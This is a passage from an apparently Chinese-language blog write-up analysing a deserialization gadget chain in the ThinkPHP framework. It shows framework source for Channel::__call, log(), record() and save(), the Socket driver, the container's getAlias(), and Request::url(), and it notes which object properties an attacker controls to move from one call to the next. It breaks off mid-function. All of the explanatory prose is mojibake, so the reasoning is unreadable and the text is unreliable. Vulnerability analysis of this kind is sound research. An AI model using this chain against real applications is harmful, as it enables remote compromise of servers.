</span></span><span class="line"><span class="cl">        <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pool</span><span class="o">-&gt;</span><span class="na">getItem</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getForStorage</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">expiresAfter</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expire</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pool</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸æ˜¯å¾ˆæ¸…æ¥šè¿™é‡Œï¼Œç¡®å®ä¼šæ‰¾å­ç±»çš„save()æ–¹æ³•çš„å®ç°ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é‡Œå°±æ˜¯è°ƒç”¨çš„è¿™ä¸ªç±»çš„save()æ–¹æ³•ï¼Œå…ˆä¸ç®¡ï¼Œè·Ÿä¸€ä¸‹é“¾å­ï¼Œåé¢åˆ†æä¸€ä¸‹ç”Ÿæˆé€»è¾‘ã€‚</p>
<p>é“¾å­åé¢ä¼šå†æ¬¡è°ƒç”¨åˆ°<code>__call()</code>æ–¹æ³•ï¼Œåªè¦å°†è¿™ä¸ªç†çš„<code>$this-&gt;pool</code>è®¾ç½®ä¸ºä¸€ä¸ªç±»å³å¯ï¼Œè¿™é‡Œé€‰ç”¨çš„æ˜¯think\log\Channelç±»çš„<code>__call()</code>æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="o">...</span><span class="nv">$parameters</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‚æ•°ä¼ é€’çš„è¯ï¼Œè¿™é‡Œçš„<code>$method</code>æ˜¯getItem()æ–¹æ³•åï¼Œè€Œ$parameterså°±æ˜¯å‰é¢ä¼ çš„<code>$this-&gt;key</code>ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªpoolå’Œkeyéƒ½æ˜¯ç±»å®šä¹‰çš„å˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œéƒ½æ˜¯å¯æ§çš„ã€‚ç„¶åè·Ÿè¿›log()æ–¹æ³•ï¼Œä¼šè°ƒç”¨record()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$level</span><span class="p">,</span> <span class="nv">$message</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$context</span> <span class="o">=</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">record</span><span class="p">(</span><span class="nv">$message</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$context</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå†è·Ÿè¿›record()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">record</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$type</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$context</span> <span class="o">=</span> <span class="p">[],</span> <span class="nx">bool</span> <span class="nv">$lazy</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">close</span> <span class="o">||</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">allow</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">allow</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$context</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$replace</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$context</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$replace</span><span class="p">[</span><span class="s1">&#39;{&#39;</span> <span class="o">.</span> <span class="nv">$key</span> <span class="o">.</span> <span class="s1">&#39;}&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">strtr</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nv">$replace</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span> <span class="o">===</span> <span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">[</span><span class="nv">$type</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="o">-&gt;</span><span class="na">trigger</span><span class="p">(</span><span class="k">new</span> <span class="nx">LogRecord</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazy</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$lazy</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»§ç»­çœ‹é“¾å­ï¼Œåœ¨record()æ–¹æ³•ä¸­ï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†è°ƒç”¨æœ€åçš„save()æ–¹æ³•ï¼Œç®€å•çœ‹ä¸€ä¸‹å‰é¢çš„ä»£ç ï¼Œçœ‹æ˜¯å¦å¯ä»¥å®ç°è°ƒç”¨save()æ–¹æ³•ï¼š</p>
<p>å‰é¢æ€»çš„æ¥è¯´æ˜¯éœ€è¦é€šè¿‡ä¸‰ä¸ªifæ¡ä»¶ï¼Œ</p>
<ul>
<li>ç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼š</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">close</span> <span class="o">||</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">allow</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">allow</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°±æ˜¯éœ€è¦<code>$this-&gt;close</code>ä¸ºfalseï¼Œç„¶ååé¢çš„allowå®šä¹‰æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä»ä»£ç é€»è¾‘æ¥çœ‹ï¼Œè¦ä¹ˆè¿™ä¸ªæ•°ç»„ä¸ºç©ºï¼Œè¦ä¹ˆè¿™ä¸ªæ•°ç»„é‡Œé¢å­˜åœ¨getItemè¿™ä¸ªå€¼ï¼Œå°±ä¸ä¼šè¿›å…¥è¿™ä¸ªifè¯­å¥ã€‚</p>
<ul>
<li>ç¬¬äºŒä¸ªifæ¡ä»¶ï¼š</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$context</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$replace</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$context</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$replace</span><span class="p">[</span><span class="s1">&#39;{&#39;</span> <span class="o">.</span> <span class="nv">$key</span> <span class="o">.</span> <span class="s1">&#39;}&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">strtr</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nv">$replace</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ¤æ–­<code>$msg</code>æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œç„¶ååˆ¤æ–­<code>$context</code>å˜é‡æ˜¯å¦ä¸ºç©ºï¼Œè¿™ä¸ª<code>$msg</code>çš„å€¼æ˜¯å¯æ§çš„ï¼Œè€Œä¸”ä»record()å‡½æ•°çš„å½¢å‚æ¥çœ‹ï¼Œè¿™é‡Œçš„<code>$context</code>å˜é‡å°±æ˜¯ä¸€ä¸ªç©ºå€¼ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªifæ¡ä»¶åº”è¯¥æ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚</p>
<ul>
<li>ç¬¬ä¸‰ä¸ªifæ¡ä»¶ï¼š</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span> <span class="o">===</span> <span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">[</span><span class="nv">$type</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="o">-&gt;</span><span class="na">trigger</span><span class="p">(</span><span class="k">new</span> <span class="nx">LogRecord</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œ<code>$msg</code>ä¸ä¸ºç©ºï¼Œå°±å¯ä»¥è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼ŒåŒæ ·å¯ä»¥æ§åˆ¶åˆ°ä¸è¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œè¿˜ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œå…ˆä¸ç®¡ã€‚</p>
<ul>
<li>æœ€ååˆ°äº†è°ƒç”¨save()æ–¹æ³•çš„ifè¯­å¥ï¼š</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazy</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$lazy</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„<code>$this-&gt;lazy</code>å˜é‡æ˜¯ç±»å˜é‡ï¼Œå¯ä»¥æ§åˆ¶ã€‚</p>
<p>é‚£ä¹ˆç°åœ¨æ¥çœ‹save()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save</span><span class="p">()</span><span class="o">:</span> <span class="nx">bool</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$log</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$event</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">LogWrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">,</span> <span class="nv">$log</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span><span class="o">-&gt;</span><span class="na">trigger</span><span class="p">(</span><span class="nv">$event</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$log</span> <span class="o">=</span> <span class="nv">$event</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logger</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$log</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clear</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„<code>$this-&gt;logger</code>å¯æ§ï¼Œè°ƒç”¨ä»»æ„ç±»çš„save()æ–¹æ³•ï¼Œæˆ–è€…<code>__call()</code>æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œçš„é“¾å­è·Ÿçš„æ˜¯think\log\driver\Socketç±»çš„save()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051537458.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305153706377"
	
	
></p>
<p>éœ€è¦check()å‡½æ•°è¿”å›trueï¼Œè·Ÿè¿›check()å‡½æ•°ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051541323.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305154131258"
	
	
></p>
<p>è¿™é‡Œåªéœ€è¦æ§åˆ¶<code>$this-&gt;config['force_client_ids']</code>ä¸ºtrueï¼Œ<code>$this-&gt;config['allow_client_ids']</code>ä¸ºç©ºï¼Œæœ€åå°±ä¼šè¿”å›trueã€‚ï¼ˆps:å…³é”®ä»£ç é€»è¾‘å¤„ç†çœŸé‡è¦å‘€ï¼Œè‡ªå·±å…ˆçœ‹äº†ä¸€ä¸‹ï¼Œä¸€ç›´æ²¡æå–å‡ºæ¥é‡ç‚¹ï¼Œçœ‹äº†ä¸€ä¸‹å‚è€ƒæ–‡ç« ï¼Œè¿™é‡ç‚¹æŠ“å¾—æ˜¯çœŸå‡†å‘€ï¼Œåªéœ€è¦æ§åˆ¶è¿™å‡ ä¸ªå‚æ•°å°±å¯ä»¥ç›´æ¥è¾¾åˆ°ç›®çš„ï¼‰ã€‚</p>
<p>è€Œå¯¹äºè¿™é‡Œå¾—configï¼Œå®šä¹‰å°±æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051544151.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305154446091"
	
	
></p>
<p>æœ€åæˆåŠŸé€šè¿‡check()å‡½æ•°ã€‚å›åˆ°save()å‡½æ•°ï¼Œé€šè¿‡æ§åˆ¶<code>$this-&gt;config['debug']</code>ä¸ºtrueï¼Œä»è€Œè¿›å…¥åˆ°ifæ¡ä»¶ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051546505.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305154615447"
	
	
></p>
<p>ç„¶åè¿™é‡Œæ˜¯å°†<code>$this-&gt;app</code>è®¾ç½®ä¸ºäº†<code>think\APP</code>ç±»ï¼Œä½†æ˜¯è¿™ä¸ªAPPç±»æ²¡æœ‰exists()æ–¹æ³•ï¼Œä¼šè°ƒç”¨åˆ°çˆ¶ç±»Containerå¾—exists()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051549361.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305154913303"
	
	
></p>
<p>ä»æ³¨é‡Šä¸­å¯ä»¥çœ‹å‡ºè¿™é‡Œå°±æ˜¯åœ¨åˆ¤æ–­å®¹å™¨ä¸­æ˜¯å¦æœ‰ç‹¬äº«å®ä¾‹ï¼Œå‚æ•°ä¼ é€’ä¸­å¯ä»¥çœ‹å‡ºè¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦æœ‰requestè¿™ä¸ªç±»çš„å®ä¾‹ï¼Œè·Ÿè¿›è¿™ä¸ªgetAlias()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getAlias</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$abstract</span><span class="p">)</span><span class="o">:</span> <span class="nx">string</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$bind</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$bind</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAlias</span><span class="p">(</span><span class="nv">$bind</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$abstract</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹äºç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œè·Ÿè¿›åˆ¤æ–­çš„<code>$this-&gt;bind[$abstract]</code>ï¼Œç”±äºè¿™é‡Œçš„<code>$this</code>è°ƒç”¨å…³ç³»ï¼Œè¿™é‡Œåˆ¤æ–­çš„æ˜¯Appç±»çš„bindå˜é‡ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051634072.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305163438010"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ç»‘å®šåˆ°æœ‰Request.classç±»çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„getAlias()æ–¹æ³•æœ€åæ˜¯ä¼šè¿”å›è¿™ä¸ªRequestç±»çš„å®Œå…¨åŒ…åï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›think\Requestã€‚ç„¶åå›åˆ°exists()æ–¹æ³•ï¼Œä¼šåˆ¤æ–­æ˜¯å¦æœ‰å®ä¾‹åŒ–ç±»ï¼Œä¹Ÿå°±æ˜¯<code>$this-&gt;instance['think\Request']</code>è¦ä¸ºtrueï¼ŒåŒæ ·å¯ä»¥ç›´æ¥åœ¨ç±»åˆå§‹åŒ–æ—¶è®¾ç½®ï¼Œæ¯”å¦‚<code>$this-&gt;instance</code>èµ‹å€¼ä¸º<code>['think\Request'=&gt;new Request()]</code>ã€‚</p>
<p>æœ€åå›åˆ°Socketæ–‡ä»¶çš„save()æ–¹æ³•ï¼Œç„¶åå°±ä¼šè°ƒç”¨Requestç±»çš„url()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">url</span><span class="p">(</span><span class="nx">bool</span> <span class="nv">$complete</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span><span class="o">:</span> <span class="nx">string</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">url</span><span class="p">;</span>
